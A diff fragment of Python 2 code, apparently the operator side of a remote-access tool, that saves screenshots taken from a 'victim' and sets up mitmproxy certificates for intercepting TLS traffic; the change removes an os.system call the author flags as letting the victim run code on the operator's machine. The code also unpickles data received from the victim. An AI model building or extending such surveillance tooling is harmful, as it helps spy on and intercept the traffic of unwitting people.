@@ -370,7 +370,7 @@ def main():
                         with open("%sScreenshots/screenShot%s.png" % (client_log_path, fancyTime), "w") as shot:
                             shot.write(base64.b64decode(screen))
                         time.sleep(1)
-                        os.system("open %sScreenshots/screenShot%s.png" % (client_log_path, fancyTime)) #We cannot have this here. Lets victim run code on our comp if they want.
+                        print "%sGot screenshot [%s]" % (greenCheck, fancyTime)
 
                 elif data.startswith('C5EBDE1F')==True:
                     deserialize = pickle.loads(data[8:])
@@ -458,7 +458,7 @@ def main():
                             import mitmproxy
                         except ImportError:
                             print 'You need to install the python library "mitmproxy" to use this function.'
-                            break
+                            nextcmd = ''
                         if not os.path.isfile("%smitm.crt" % helperpath):
                             print "%sNo local Certificate Authority found.\nThis is necessary to decrypt TLS/SSL traffic.\nFollow the steps below to generate the certificates.%s\n\n" % (red, endC)
                             os.system("openssl genrsa -out mitm.key 2048")
